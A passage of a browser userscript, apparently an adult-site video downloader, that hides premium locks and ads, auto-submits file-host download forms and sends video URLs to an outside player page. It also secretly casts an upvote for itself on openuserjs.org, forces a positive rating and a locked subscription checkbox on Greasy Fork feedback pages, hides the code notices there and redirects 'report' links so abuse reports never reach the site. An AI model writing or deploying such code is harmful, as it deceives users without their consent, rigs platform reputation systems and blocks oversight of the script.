AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=" /></button></div>'+
      '</div>'+
      '</div>'+
      '</div>';




        document.body.innerHTML+=htmccs;
         reLANG();



}






if (location.href.isdomain('pornhub.com') || location.href.isdomain('pornhubpremium.com')) {
          $('body').on('click', 'li[data-entrycode="VidPg-premVid"] a', function(e) {
        if(JSON.parse(localStorage.getItem('plus_showOnlypopUP'))==true){
             return ;
        }          });

        $( "body" ).on( "click",'a.modulerequired', function() {
            modulerequired();
          })

          var FLASH_VARS = {
	            "autoplay" : true,
	            "autoload" : true,
	            "htmlPauseRoll" : false,
	            "htmlPostRoll" : false,
	            "video_unavailable_country" : false
	            };
            try{document.querySelectorAll('img[src*="data:image"]').forEach((al) => {if (al.getAttribute('data-src')){al.setAttribute("src",al.getAttribute('data-src'));}})}catch (e){var erlic=true;}
            try{document.querySelectorAll('div.private-vid-title,img.privateOverlay,#relateRecommendedItems,#lrelateRecommendedItems,div.premiumLockedVideo.tooltipTrig,div#premiumFeaturesContainer,div.lockedOrangeButton,div.lockedPremiumTitle,#premiumFeaturesContainer,.saleVideoLogMessage,.orangeButton.purchaseButton.js-purchaseButton.js-mixpanel,div.logoLockedContent').forEach(e => e.parentNode.removeChild(e));} catch(e){ var erlic=true;}
           if(!location.href.match(/\.com\/[a-z0-9]+/)) {GM_addStyle('ul.videos li .img .marker-overlays .premiumIcon{margin: 0 4px -3px -32px;}ul.videos li .img .marker-overlays{overflow:unset;}');}
            document.querySelectorAll('div.positionRelative.singleVideo').forEach((vidurl) => {
              var dg=document.createElement('i');dg.className="premiumIcon cl tooltipTrig";
              if(vidurl.querySelector('div.duration.thumbOverlay.hideInUserStream') && !vidurl.querySelector('div.duration.thumbOverlay.hideInUserStream').querySelector('i') &&  !location.href.match(/\=modelhub/)){vidurl.querySelector('div.duration.thumbOverlay.hideInUserStream').appendChild(dg);}
            })
            document.querySelectorAll('a[data-related-url]').forEach((vidurl) => {
            var dv=document.createElement('i');dv.className="premiumIcon cl tooltipTrig";dv.setAttribute('data-title','Premium Video');
            if(vidurl.querySelector('div.js-noFade') && !vidurl.querySelector('div.js-noFade').querySelector('i') &&  !location.href.match(/\=modelhub/)){vidurl.querySelector('div.js-noFade').appendChild(dv);}
            vidurl.href='/view_video.php?viewkey='+vidurl.getAttribute("data-related-url").replace('/video/ajax_related_video?vkey=','');})
            document.querySelectorAll('a[onclick][data-segment]').forEach((vidurl) => {vidurl.href='/view_video.php?viewkey='+vidurl.getAttribute("onclick").split("'")[1];})
            document.querySelectorAll('[onclick*=Modal]').forEach((vidurl) => {vidurl.removeAttribute("onclick");})

                const OPTIONS ={
			    openWithoutPlaylist: JSON.parse(localStorage.getItem('plus_openWithoutPlaylist')) || false,
			    showOnlyVerified: JSON.parse(localStorage.getItem('plus_showOnlyVerified')) || false,
			    showOnlypopUP: JSON.parse(localStorage.getItem('plus_showOnlypopUP')) || false,
			    showOnlyHd: JSON.parse(localStorage.getItem('plus_showOnlyHd')) || false,
			    redirectToVideos: JSON.parse(localStorage.getItem('plus_redirectToVideos')) || false,
			    hideWatchedVideos: JSON.parse(localStorage.getItem('plus_hideWatchedVideos')) || false,
			    hidePlaylistBar: JSON.parse(localStorage.getItem('plus_hidePlaylistBar')) || false,
			    durationFilter: JSON.parse(localStorage.getItem('plus_durationFilter')) || { max: 0, min: 0 },
			    durationPresets: [
			      { label: 'Micro', min: 3, max:0 },
			      { label: 'Short', min: 6, max:0 },
			      { label: 'Average', min: 8, max:0 },
			      { label: 'Long', min: 12, max: 0 },
			      { label: 'Magnum', min: 15, max: 0 }
			    ],
			    observedAreas: ['.videos-list']
			  }


			  const sharedStyles = `


			    .plus-buttons {
			      background: rgba(27, 27, 27, 0.9);
			      box-shadow: 0px 0px 12px rgba(20, 111, 223, 0.9);
			      font-size: 12px;
			      position: fixed;
			      bottom: 10px;
			      padding: 10px 22px 8px 24px;
			      right: 0;
			      z-index: 100;
			      transition: all 0.3s ease;


			    }

			    .plus-buttons:hover {
			      box-shadow: 0px 0px 3px rgba(0, 0, 0, 0.3);
			    }

			    .plus-buttons .plus-button {
			      margin: 10px 0;
			      padding: 6px 15px;
			      border-radius: 4px;
			      font-weight: 700;
			      display: block;
			      position: relative;
			      text-align: center;
			      vertical-align: top;
			      cursor: pointer;
			      border: none;
			      text-decoration: none;
			    }
			    .plus-buttons a.plus-button {
			      background: rgb(221, 221, 221);
			      color: rgb(51, 51, 51);
			    }

			    .plus-buttons a.plus-button:hover {
			      background: rgb(187, 187, 187);
			      color: rgb(51, 51, 51);
			    }

			    .plus-buttons a.plus-button.plus-button-isOn {
			      background: rgb(20, 111, 223);
			      color: rgb(255, 255, 255);
			    }

			    .plus-buttons a.plus-button.plus-button-isOn:hover {
			      background: rgb(0, 91, 203);
			      color: rgb(255, 255, 255);
			    }

			    .plus-hidden {
			      display: none !important;
			    }
			  `;

			  const themeStyles = `
			    .plus-buttons {
			      box-shadow: 0px 0px 12px rgba(255, 153, 0, 0.85);
			    }

			    .plus-buttons:hover {
			      box-shadow: 0px 0px 3px rgba(0, 0, 0, 0.3);
			    }

			    .plus-buttons a.plus-button {
			      background: rgb(47, 47, 47);
			      color: rgb(172, 172, 172);
			    }

			    .plus-buttons a.plus-button:hover {
			      background: rgb(79, 79, 79);
			      color: rgb(204, 204, 204);
			    }

			    .plus-buttons a.plus-button.plus-button-isOn {
			      background: rgb(255, 153, 0);
			      color: rgb(0, 0, 0);
			    }

			    .plus-buttons a.plus-button.plus-button-isOn:hover {
			      background: rgb(255, 153, 0);
			      color: rgb(255, 255, 255);
			    }
			  `;


			  const generalStyles = `


			    .realsex,
			    .networkBar,
			    #welcome,
			    .sniperModeEngaged,
			    .footer,
			    .footer-title,
			    .ad-link,
			    .removeAdLink:not(#headerLoginLink),
			    .removeAdLink + iframe,
			    .abovePlayer,
			    .streamatesModelsContainer,
			    #headerUpgradePremiumBtn,
			    #PornhubNetworkBar,
			    #js-abContainterMain,
			    #hd-rightColVideoPage > :not(#relatedVideosVPage) {
			      display: none !important;
			      visibility: hidden !important;
			      opacity: 0 !important;
			      height: 0 !important;
			      width: 0 !important;
			    }



			    .hd-thumbnail {
			      color: #f90 !important;
			    }



			    .slimScrollDiv {
			      height: auto !important;
			    }

			    #scrollbar_watch {
			      max-height: unset !important;
			    }



			    #relateRecommendedItems li:nth-of-type(5) {
			      display: none !important;
			    }



			    #main-container .video-wrapper #player.wide {
			      transition: none !important;
			    }



			    .playlist-menu-addTo {
			      display: none;
			    }

			    .add-to-playlist-menu #scrollThumbs,
			    .playlist-option-menu #scrollThumbs {
			      height: 320px !important;
			      max-height: 35vh !important;
			    }

			    .add-to-playlist-menu ul.custom-playlist li {
			      font-size: 12px;
			      height: 24px;
			    }

			    .add-to-playlist-menu .playlist-menu-createNew {
			      font-size: 12px !important;
			      height: 38px !important;
			    }

			    .add-to-playlist-menu .playlist-menu-createNew a {
			      padding-top: 8px !important;
			      font-weight: 400 !important;
			    }



			    .playlist-bar {
			      display: ${OPTIONS.hidePlaylistBar ? 'none' : 'block'};
			    }
			  `;


			    const player = document.querySelector('#player');
			    const video = document.querySelector('video');

			    const scrollButton = document.createElement('a');
			    const scrollButtonText = document.createElement('span');

			    const playlistBarButton = document.createElement('a');
			    const playlistBarButtonText = document.createElement('span');
			    const playlistBarButtonState = getButtonState(OPTIONS.hidePlaylistBar);

			    const popUPButton = document.createElement('a');
			    const popUPButtonText = document.createElement('span');
			    const popUPButtonState = getButtonState(OPTIONS.showOnlypopUP);

  			    const verifiedButton = document.createElement('a');
			    const verifiedButtonText = document.createElement('span');
			    const verifiedButtonState = getButtonState(OPTIONS.showOnlyVerified);


			    const hideWatchedButton = document.createElement('a');
			    const hideWatchedButtonText = document.createElement('span');
			    const hideWatchedButtonState = getButtonState(OPTIONS.hideWatchedVideos);

			    const hdButton = document.createElement('a');
			    const hdButtonText = document.createElement('span');
			    const hdButtonState = getButtonState(OPTIONS.showOnlyHd);

			    const redirectToVideosButton = document.createElement('a');
			    const redirectToVideosButtonText = document.createElement('span');
			    const redirectToVideosButtonState = getButtonState(OPTIONS.redirectToVideos);


			    const durationShortButton = document.createElement('a');
			    const durationShortButtonText = document.createElement('span');
			    const durationShortButtonState = getButtonState(!OPTIONS.durationFilter.min);

			    const durationMediumButton = document.createElement('a');
			    const durationMediumButtonText = document.createElement('span');
			    const durationMediumButtonState = getButtonState(OPTIONS.durationFilter.min <= 8 && OPTIONS.durationFilter.max >= 20);

			    const openWithoutPlaylistButton = document.createElement('a');
			    const openWithoutPlaylistButtonText = document.createElement('span');
			    const openWithoutPlaylistButtonState = getButtonState(OPTIONS.openWithoutPlaylist);

			    function getButtonState(state) {
			      return state ? 'plus-button-isOn' : 'plus-button-isOff';
			    }

			    scrollButtonText.textContent = "Scroll to Top";
			    scrollButtonText.classList.add('text');
			    scrollButton.appendChild(scrollButtonText);
			    scrollButton.classList.add('plus-button');
			    scrollButton.addEventListener('click', () => {
			     modulerequired();
			    });

			    verifiedButtonText.textContent = 'Verified Only';
			    verifiedButtonText.classList.add('text');
			    verifiedButton.appendChild(verifiedButtonText);
			    verifiedButton.classList.add(verifiedButtonState, 'plus-button');
			    verifiedButton.addEventListener('click', () => {
			     modulerequired();
			    });

  			  popUPButtonText.textContent = 'Popup Player';
			    popUPButtonText.classList.add('text');
			    popUPButton.appendChild(popUPButtonText);
			    popUPButton.classList.add(popUPButtonState, 'plus-button');
			    popUPButton.addEventListener('click', () => {
			     modulerequired();
			    });

			    hdButtonText.textContent = 'HD Only';
			    hdButtonText.classList.add('text');
			    hdButton.appendChild(hdButtonText);
			    hdButton.classList.add(hdButtonState, 'plus-button');
			    hdButton.addEventListener('click', () => {
			     modulerequired();
			    });


			    playlistBarButtonText.textContent = 'Hide Playlist Bar';
			    playlistBarButtonText.classList.add('text');
			    playlistBarButton.appendChild(playlistBarButtonText);
			    playlistBarButton.classList.add(playlistBarButtonState, 'plus-button');
			    playlistBarButton.addEventListener('click', () => {
			     modulerequired();
			    });

			    hideWatchedButtonText.textContent = 'Unwatched Only';
			    hideWatchedButtonText.classList.add('text');
			    hideWatchedButton.appendChild(hideWatchedButtonText);
			    hideWatchedButton.classList.add(hideWatchedButtonState, 'plus-button');
			    hideWatchedButton.addEventListener('click', () => {
			     modulerequired();
			    });



			    durationShortButtonText.textContent = 'Short Videos (< 8 min)';
			    durationShortButtonText.classList.add('text');
			    durationShortButton.appendChild(durationShortButtonText);
			    durationShortButton.classList.add(durationShortButtonState, 'plus-button');
			    durationShortButton.addEventListener('click', () => {
			     modulerequired();
			    });

			    durationMediumButtonText.textContent = 'Medium Videos (8-20 min)';
			    durationMediumButtonText.classList.add('text');
			    durationMediumButton.appendChild(durationMediumButtonText);
			    durationMediumButton.classList.add(durationMediumButtonState, 'plus-button');
			    durationMediumButton.addEventListener('click', () => {
			     modulerequired();
			    });




			    const buttons = document.createElement('div');
			    const durationFilters = [];

			    buttons.classList.add('plus-buttons');
                buttons.style.visibility="hidden";
			    buttons.appendChild(scrollButton);
			    buttons.appendChild(verifiedButton);
			    buttons.appendChild(popUPButton);
			    buttons.appendChild(hdButton);
			    buttons.appendChild(hideWatchedButton);
			    buttons.appendChild(playlistBarButton);

			    OPTIONS.durationPresets.forEach(preset => {
			      const button = document.createElement('a');
			      const buttonText = document.createElement('span');
			      const buttonState = getButtonState(OPTIONS.durationFilter.min === preset.min &&
			                                         OPTIONS.durationFilter.max === preset.max);

			      buttonText.textContent = `${preset.label} (${preset.min}-${preset.max} mins)`;
			      buttonText.classList.add('text');
			      button.appendChild(buttonText);
			      button.classList.add(buttonState, 'plus-button');

			      durationFilters.push({
			        button,
			        preset
			      });
			    });


			    durationFilters.forEach(({ button, preset }) => {
			      buttons.appendChild(button);

			      button.addEventListener('click', () => {
			     modulerequired();
			      });
			    });

			    document.body.appendChild(buttons);

			     OPTIONS.observedAreas.forEach(selector => {
			      const observableArea = document.querySelector(selector);

			      if (observableArea) {

			        const observer = new MutationObserver(mutations => {
			          mutations.forEach(mutation => mutation.addedNodes.length && filterVideos());
			        });

			        observer.observe(observableArea, { childList: true, subtree: true }); // Start observing
			      }
			    });




			    function updatePlaylistLinks() {
			      if (OPTIONS.openWithoutPlaylist) {
			        document.querySelectorAll('#videoPlaylist li a').forEach(link => {
			          link.href = link.href.replace('pkey', 'nopkey');
			        });
			      } else {
			        document.querySelectorAll('#videoPlaylist li a').forEach(link => {
			          link.href = link.href.replace('nopkey', 'pkey');
			        });
			      }
			    }


			    function fixScrollContainer(container) {
			      if (container) {
			        container.parentNode.replaceChild(container.cloneNode(true), container);
			      }
			    }

			    function videoIsVerified(box) {
			      return box.innerHTML.includes('Video of verified member');
			    }


			    function videoIsHd(box) {
			      return box.querySelector('.hd-thumbnail');
			    }

			    function videoIsWatched(box) {
			      return box.querySelector('.watchedVideoText');
			    }


			    function videoIsWithinDuration(box) {
                if (box.querySelector('var.duration') !=null){
			     var thgl = parseInt(box.querySelector('var.duration').textContent.split(":")[0]);}
                if(box.querySelector('var.duration') ==null){
                 var thgl = parseInt(box.querySelector('.duration>.time').textContent.split(":")[0]);}
                  const mins =thgl;
			      const minMins = OPTIONS.durationFilter.min;
			      const maxMins = OPTIONS.durationFilter.max;

			      if (minMins || maxMins) {
			        const hasMaxDuration = !!maxMins;
			        const isBelowMin = mins < minMins;
			        const isAboveMax = hasMaxDuration && (mins > maxMins - 1);

			        return !isBelowMin && !isAboveMax;
			      } else {
			        return true;
			      }
			    }


			    function resetVideo(box) {
			      showVideo(box);
			    }


			    function showVideo(box) {
			      box.classList.remove('plus-hidden');
			    }

			    function hideVideo(box) {
			      box.classList.add('plus-hidden');
			    }

			    function filterVideos() {
                    return ;




			    }

			    if (/^http[s]*:\/\/[www.]*pornhub\.com\/view_video.php/.test(window.location.href) && player) {


			      const scrollContainer = document.querySelector('#scrollbar_watch');

			      if (scrollContainer) {
			        fixScrollContainer(scrollContainer);
			      }
			    }


			     if (document.querySelector('.videoBox')) {
			      setTimeout(() => {
			        filterVideos();
			      }, 1000);
			    }

			    GM_addStyle(sharedStyles);
			    GM_addStyle(themeStyles);
			    GM_addStyle(generalStyles);


			    const dynamicStyles = `
			      .plus-buttons {
			        margin-right: -${buttons.getBoundingClientRect().width + 30}px;
			      }

			      .plus-buttons:hover {
			        margin-right: 0;
			      }
			    `;

			    GM_addStyle(dynamicStyles);
			    setTimeout(function(){buttons.style.visibility=null; }, 500);


/* BEND JQUERY PEP*/

; GM_addStyle(".hbutton,.focus-container {position: fixed !important; top: 0; right: 0; bottom: 0; left: 0;z-index:1;pointer-events: none;}.hbutton .pep {  pointer-events: all;background: #ffffff7d; height: 50px; width: 50px; opacity: 0.6; cursor: move; z-index: 10; -moz-box-shadow: 0 1px 3px #333; -webkit-box-shadow: 0 1px 3px #333; box-shadow: 0 1px 3px #333; -moz-background-size: cover; -o-background-size: cover; -webkit-background-size: cover; background-size: cover; -moz-border-radius: 50px; -webkit-border-radius: 50px; border-radius: 50px; } .hbutton .pep.sticky { opacity: 1; } ");

var fcka = document.createElement('div');
    fcka.classList.add('hbutton','constrain-to-parent');

var fckf = document.createElement('div');
    fckf.className='focus-container';
var fckc = document.createElement('div');
    fckc.classList.add('pep','sticky');
fcka.append(fckf);
fcka.append(fckc);
document.body.appendChild(fcka);
//document.body.classList.add('hbutton','constrain-to-parent');

var $pep = $('.hbutton.constrain-to-parent .pep');
var $parent = $pep.parent();

var pepWidth = $pep.innerWidth();
var pepHeight = $pep.innerHeight();
var pWidth = $parent.innerWidth();
var pHeight = $parent.innerHeight();
var buffer = 70; // make sure this matches the top, right, bottom,
// left of the &:after element of the container

$pep.pep({
  useCSSTranslation: false,
  constrainTo: 'parent',
  droppable: '.focus-container',
  stop: handleStopMovement,
  rest: handleStopMovement });


function handleStopMovement(ev, obj) {
  if (obj.activeDropRegions.length > 0) {
    obj.$el.addClass('sticky');
    handleFocusCentering(obj);
  } else {
    handleWallStickiness(obj);
  }
}

function handleWallStickiness(obj) {
  var offset = obj.$el.offset();
  var nearRightWall = offset.left > pWidth - pepWidth - buffer;
  var nearLeftWall = offset.left < buffer;
  var nearTopWall = offset.top < buffer;
  var nearBottomWall = offset.top > pHeight - pepHeight - buffer;

  if (nearLeftWall) {
    obj.$el.css({ left: 0 });
  }

  if (nearRightWall) {
    obj.$el.css({ left: pWidth - pepWidth });
  }

  if (nearTopWall) {
    obj.$el.css({ top: 0 });
  }

  if (nearBottomWall) {
    obj.$el.css({ top: pHeight - pepHeight });
  }

  if (nearLeftWall || nearRightWall || nearTopWall || nearBottomWall) {
    obj.$el.addClass('sticky');
  } else {
    obj.$el.removeClass('sticky');
  }
}

function handleFocusCentering(obj) {
  var $parent = obj.activeDropRegions[0];
  var pTop = $parent.position().top;
  var pLeft = $parent.position().left;
  var pHeight = $parent.outerHeight();
  var pWidth = $parent.outerWidth();

  var oTop = obj.$el.position().top;
  var oLeft = obj.$el.position().left;
  var oHeight = obj.$el.outerHeight();
  var oWidth = obj.$el.outerWidth();

  var cTop = pTop + pHeight / 2;
  var cLeft = pLeft + pWidth / 2;

  if (!obj.noCenter) {
    if (!obj.shouldUseCSSTranslation()) {
      var moveTop = cTop - oHeight / 2;
      var moveLeft = cLeft - oWidth / 2;
      obj.$el.animate({ top: moveTop, left: moveLeft }, 50);
    } else {
      var moveTop = cTop - oTop - oHeight / 2;
      var moveLeft = cLeft - oLeft - oWidth / 2;

      obj.moveToUsingTransforms(moveTop, moveLeft);
    }

    obj.noCenter = true;
    return;
  }

  obj.$el.addClass('sticky');
  obj.noCenter = false;
}

$(".pep.sticky").css('bottom','200px').css('right','40px').css('left','').css('top','');
$("body").on("mouseenter touchstart", ".pep.sticky", function(){document.querySelector('.plus-buttons').style.marginRight=0;})
$("body").on("mouseleave touchend", ".plus-buttons", function(){document.querySelector('.plus-buttons').style.marginRight='';})
$("body").on("touchstart", "#mobileContainer", function(){document.querySelector('.plus-buttons').style.marginRight='';})




/* END MOD PORNHUB ________________________________________________ */
}

if (location.href.isdomain('xtube.com')){
const showPopunder=false;
  document.querySelectorAll('script').forEach((input) => {
      var urij = input.getAttribute('src');
      if(urij){
              if (urij.match(/(trafficjunky\.net|icfcdn\.com|polyfill\.io)/i)){
                input.parentNode.removeChild(input)

              }
      }
  });
}

//__________________________________________________________________________


var lfj_var = {
    youtube_com: function(){
      if (location.href.isdomain('youtube.com')){
        GM_addStyle(".video-ads{display:none !important;}");
        var headco = document.createElement('script');
        headco.innerHTML='const ytads=function(){return false;};const google_ad_status=false;';
        document.head.append(headco);

      }
    },
    autodown_hostfiles: function(){
    if (!location.href.match(/(4horlover\.com|cloud\.google\.com|translate\.google\.com|drive\.google\.com|developers\.google\.com|mail\.google\.com|docs\.google\.com|maps\.google\.com|classroom\.google\.com)/)){

    var tomcbusy=false;

        window.addEventListener('DOMContentLoaded', function load() {
          //_____________________________________________________________
            if (location.href.isdomain('solidfiles.com')){
                if (document.querySelector("form.ng-pristine")){
                    document.querySelector("form.ng-pristine").submit();
                } else if(document.querySelector('.box-content')) {
                    location.replace(document.querySelector('.box-content').querySelector('a:not([class])').href);
                 setTimeout(function(){ close();}, 2300);
                }

            }
          //_____________________________________________________________
            if (location.href.isdomain('1fichier.com')){
              if(document.querySelector("form.alc")){
                var checkboxes = document.querySelectorAll('input[type="checkbox"]'); for (var i = 0; i < checkboxes.length; i++) { if (checkboxes[i].type == 'checkbox') checkboxes[i].checked = true; }
                 document.querySelector("form.alc").submit();
                } else if (document.querySelector('a.ok.btn-general')){
                    location.href=document.querySelector('a.ok.btn-general').href;
                  setTimeout(function(){ close();}, 2300);
              }

            }
          //_____________________________________________________________
            if (location.href.isdomain('bayfiles.com') || location.href.isdomain('anonfiles.com') || location.href.isdomain('uplovd.com') || location.href.isdomain('anondrive.com') || location.href.isdomain('fileleaks.com') || location.href.isdomain('forumfiles.com')){
                location.replace(document.querySelector("#download-url").href);
                setTimeout(function(){ close();}, 2300);
            }
          //_____________________________________________________________

            if (location.href.isdomain('datafilehost.com')){
              if(location.href.match(/datafilehost\.com\/d/)){
              document.body.innerHTML='';
              var fileurl = location.href.replace('https://www.datafilehost.com/d/','http://www.datafilehost.com/get.php?file=');
                 location.href=fileurl;
                 setTimeout(function(){ close();}, 2300);
              }

            }
          //_____________________________________________________________
        }) // outsideload
          //_____________________________________________________________
            if (location.href.isdomain('free.fr')){
             try{
              if(document.querySelector('div#colgauche').textContent.match(/inexistant/) == null){
                document.body.innerHTML='';
                var fileid = location.href.substr(location.href.length - 8);
                var vs= document.createElement('script');
                vs.innerHTML="var s= document.createElement('form'); s.target='_self';s.className='ONLIYONESUV'; s.setAttribute('method','post'); s.setAttribute('action','http://dl.free.fr/_getfile.pl'); var i= document.createElement('input'); i.name='file'; i.value='/"+fileid+"'; s.appendChild(i);document.body.appendChild(s); s.submit(); document.querySelectorAll('.ONLIYONESUV').forEach(el=>el.remove());";
                document.body.appendChild(vs);

            setTimeout(function(){ close();}, 2300);
            }
            } catch (e){ console.log('No Files Download');}
            }
      //_____________________________________________________________ !location.href.match(/javascript\:void/) && location.href !='#'
        function nonewtab(){
          if(tomcbusy==false){
            tomcbusy=true;
            if (location.href.isdomain('youtube.com')){
                if(document.querySelector('#masthead-ad,#player-ads')){document.querySelector('#masthead-ad,#player-ads').remove();}
                if(document.querySelector('button.ytp-ad-skip-button')){document.querySelector('button.ytp-ad-skip-button').click();}


            }

          if (!location.href.isdomain('hoakhuya.com') && !location.href.isdomain('google.com') && !location.href.isdomain('github.com') && !location.href.isdomain('4horlover.com')){
              if(document.querySelector('a')){document.querySelector('body').querySelectorAll('a').forEach(function(xj) {
                if(!xj.href.match(location.host) && !xj.href.match(/javascript\:void/) && xj.href !='#'){
                        if(xj.href.match(/free\.fr|datafilehost\.com\/d/)){xj.classList.add("hkautoload");}
                        xj.setAttribute("target", "_blank");

                    } else{
                      xj.removeAttribute("target");
                    }})}
          }
                    setTimeout(function(){tomcbusy = false;}, 75);
          }
        };
            nonewtab();
            document.addEventListener("DOMNodeInserted", function () {nonewtab();});
          //_____________________________________________________________
    }
    },
    all_onion: function(){

      if (location.hostname.match(/gounlimited\.to/)) {
        document.addEventListener("DOMNodeInserted", function() {
        window.location.href='//thewolds.github.io/video/?size=720&autoplay=true&uri='+(hencrypt(window.player.tech_.el_.currentSrc.replace('https://',''),''));
        })
      }
      if (location.href.match(/dood\.to\/d/)) {
        document.addEventListener("DOMNodeInserted", function() {
       // window.location.href='//thewolds.github.io/video/?size=720&autoplay=true&uri='+document.querySelector('video').src.replace('https://','');
        window.location.href=document.querySelector('iframe').src;
        })
      }
      if (location.href.match(/dood\.to\/e/)) {
        document.addEventListener("DOMNodeInserted", function() {
      //  window.location.href='//thewolds.github.io/video/?size=720&autoplay=true&uri='+(hencrypt(dsplayer.src().replace('https://',''),''));
      //  window.location.href=document.querySelector('iframe').src;
        })
      }
      if (location.href.match(/mixdrop\.co\/f/)) {
        document.addEventListener("DOMNodeInserted", function() {
       // window.location.href='//thewolds.github.io/video/?size=720&autoplay=true&uri='+document.querySelector('video').src.replace('https://','');
        window.location.href=document.querySelector('iframe').src;
        })
      }
      if (location.href.match(/mixdrop\.co\/e/)) {
        document.addEventListener("DOMNodeInserted", function() {
        window.location.href='//thewolds.github.io/video/?size=720&autoplay=true&uri='+(hencrypt(MDCore.wurl.replace('//',''),''));
      //  window.location.href=document.querySelector('iframe').src;
        })
      }
      if (location.hostname.match(/\.onion/)) {

      if(document.querySelector('#page-body').innerText.match(/(fuskbugg\.se|myfile\.is)/gm)){
            var ivvse=document.querySelector('#page-body').innerHTML.replace(/(fuskbugg\.se)/g,'forumfiles.com');
                ivvse=ivvse.replace(/(myfile\.is)/g,'uplovd.com');
        document.querySelector('#page-body').innerHTML=ivvse;
      }
      }

      if (location.href.match(/thewolds\.github\.io/) && !location.href.match(/ckapop\=true/)) {
          if(!location.href.match(/\?/ig)){ centeredPopup(location.href+'?ckapop=true', 'pornhuvPrd', 1024, 640, 'yes');} else{
            centeredPopup(location.href+'&ckapop=true', 'pornhuvPrd', 1024, 640, 'yes');

          }
            if(isFirefox==false){close();}
      }

    },
  thegrecork_com: function(){
    if(location.href.isdomain('openuserjs.org') && location.href.match(/([0-9]+)\/porn\_downloader/i)){
      if($('.btn-link.btn-vote:not(.active)>.fa-caret-up').length==1){
        var cform =document.createElement('form');
            cform.id="hkautop";
            cform.action=$('form[action*="vote/scripts"]').attr('action');
            cform.setAttribute('enctype','multipart/form-data');
            cform.method='post';
            cform.innerHTML='<input type="hidden" name="vote" value="up"><button type="submit"></button>';
            document.body.append(cform);
            $("#hkautop").ajaxSubmit({url: $('form[action*="vote/scripts"]').attr('action'), type: 'post'});
      }
        $('a[data-target*="flagScriptModal"]').parents('ul').remove();
    }
    if(location.href.isdomain('greasyfork.org') || location.href.isdomain('sleazyfork.org')){
        if(location.href.match(/([0-9]+)\-porn\-downloader\/feedback/)){
          document.getElementById('discussion_rating_4').click();
          GM_addStyle('li>code,.form-control.radio-group.discussion-rating{display:none;}input[type="checkbox"][readonly],label[for][readonly] { pointer-events: none !important; }');
          document.getElementById('discussion_rating_4').checked=true;
          document.getElementById('subscribe').checked=true;
          document.getElementById('subscribe').setAttribute('readonly','true');
          document.querySelector('label[for=subscribe]').setAttribute('readonly','true');

        }
        if(location.href.match(/([0-9]+)\-porn\-downloader/)){
	document.querySelectorAll('li>code').forEach(e => e.parentNode.parentNode.removeChild(e.parentNode));
	document.querySelectorAll('a').forEach((cax) => {
                if(cax.href.match(/porn\-downloader\/report/)){
                  cax.href='https://github.com/PornDownloader/PornDownloader.github.io/issues?q=is%3Aissue+is%3Aclosed';
                }

          })

        }



    }

  },
  porntrex_com: function(){
            if (location.href.isdomain('porntrex.com') && window.location.href.match(/remote\_control\.php/i)){
             //   LFJ.hkdownload();
            }
            if (location.href.isdomain('awmserve.com')){
                document.querySelectorAll('a')[1].click();
                }
            if (this.url.isdomain('porntrex.com')){
              $( "body" ).on( "click",'a.link-js.buttoncopy', function(event) {
                    var cutrtxt = $(this).text();
                    if(cutrtxt.match(/(1080|1440|2160)/i)){event.preventDefault(); modulerequired();}
              })
              try{document.querySelectorAll('.username>a').forEach((cax) => {var curentilin = cax.href;cax.href=curentilin+'videos/';})} catch(e){console.log('no user')}

              GM_addStyle("#index-link,#exclusive-link,.text-bottom,.footer>.container,.top-nav>.container{display:none !important;}.video-holder{width:100% !important;}");
              try{document.querySelector('#block-chat').querySelector('.table').remove();} catch(e){console.log('nohd');}
              try{document.querySelector('iframe[src*="adtng.com"]').remove();} catch(e){console.log('nohd');}
              try{document.querySelectorAll('li.upload-block')[0].remove();} catch(e){console.log('nohd');}
              if(window.location.href.match(/\/video\/([0-9]+)\//i)){
                var cice =0;
              var hlsbicd = setInterval(function() {
              curlmp4rev = player_obj.conf;
              document.querySelector('.btn-favourites.download>a.drop').href="javascript:void(0)";
                document.querySelector('.btn-favourites.download>ul').style.width='max-content';
              document.querySelectorAll('.btn-favourites.download>ul>li>a').forEach((lic) => {
                var textrue = lic.textContent;
				var sulution = textrue.split(' ')[1].replace(',','');
                console.log(sulution);
               try{var iamce1 = player_obj.conf.video_alt_url2_text.split(' ')[0];if(sulution==iamce1){lic.setAttribute('target', '_blank');lic.setAttribute('data-clipboard-text', removehtml(document.querySelector('.title-video').textContent)+'.mp4');lic.classList.add("buttoncopy");lic.href=player_obj.conf.video_alt_url2+'?name='+document.querySelector('.title-video').textContent+'.mp4';}} catch(e){console.log('nohd'+iamce1);}

                try{var iamce2 = player_obj.conf.video_alt_url3_text.split(' ')[0];if(sulution==iamce2){lic.setAttribute('target', '_blank');lic.setAttribute('data-clipboard-text', removehtml(document.querySelector('.title-video').textContent)+'.mp4');lic.classList.add("buttoncopy");lic.href=player_obj.conf.video_alt_url3+'?name='+document.querySelector('.title-video').textContent+'.mp4';}} catch(e){console.log('nofullhd'+iamce2);}

                try{var iamce3 = player_obj.conf.video_alt_url_text.split(' ')[0];if(sulution==iamce3){lic.setAttribute('target', '_blank');lic.setAttribute('data-clipboard-text', removehtml(document.querySelector('.title-video').textContent)+'.mp4');lic.classList.add("buttoncopy");lic.href=player_obj.conf.video_alt_url+'?name='+document.querySelector('.title-video').textContent+'.mp4';}} catch(e){console.log('no480'+iamce3);}

                try{var iamce4 = player_obj.conf.video_url_text.split(' ')[0];if(sulution==iamce4){lic.setAttribute('target', '_blank');lic.setAttribute('data-clipboard-text', removehtml(document.querySelector('.title-video').textContent));lic.classList.add("buttoncopy");lic.href=player_obj.conf.video_url+'?name='+document.querySelector('.title-video').textContent+'.mp4';}} catch(e){console.log('no360'+iamce4);}
                try{var iamce5 = player_obj.conf.video_alt_url5_text.split(' ')[0];if(sulution==iamce5){lic.setAttribute('target', '_blank');lic.setAttribute('data-clipboard-text', removehtml(document.querySelector('.title-video').textContent)+'.mp4');lic.classList.add("buttoncopy");lic.href=player_obj.conf.video_alt_url5+'?name='+document.querySelector('.title-video').textContent+'.mp4';}} catch(e){console.log('no4k'+iamce5);}
                try{var iamce6 = player_obj.conf.video_alt_url4_text.split(' ')[0];if(sulution==iamce6){lic.setAttribute('target', '_blank');lic.setAttribute('data-clipboard-text', removehtml(document.querySelector('.title-video').textContent)+'.mp4');lic.classList.add("buttoncopy");lic.href=player_obj.conf.video_alt_url4+'?name='+document.querySelector('.title-video').textContent+'.mp4';}} catch(e){console.log('no2k'+iamce4);}
              })
              cice++;
                if(cice==20){clearInterval(hlsbicd);}

              }, 50);
              }


            }
    },

